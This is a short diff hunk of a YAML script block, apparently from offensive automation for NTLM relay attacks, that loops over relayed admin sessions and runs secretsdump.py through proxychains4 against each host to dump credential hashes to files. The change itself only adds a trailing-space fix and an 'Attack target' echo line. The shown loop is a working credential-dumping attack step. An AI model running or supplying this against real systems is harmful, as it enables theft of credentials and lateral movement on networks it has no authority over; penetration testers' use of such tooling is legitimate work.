@@ -48,7 +48,8 @@ script: >-
   for prx in $(echo $adminrelx | jq -r '.[2]+"@"+ .[1]'); do 
   host_ip=${prx#*@};
   if ! (ls | grep $host_ip. -q) && ! (echo $checked_relayes | grep -w -q $prx); then
-  date -Ins; 
+  date -Ins;
+  echo "Attack target: $prx";
   proxychains4 -f $prx_config_file_path secretsdump.py -outputfile $host_ip $prx -no-pass; checked_relayes="$checked_relayes $prx";
   echo;
   fi;
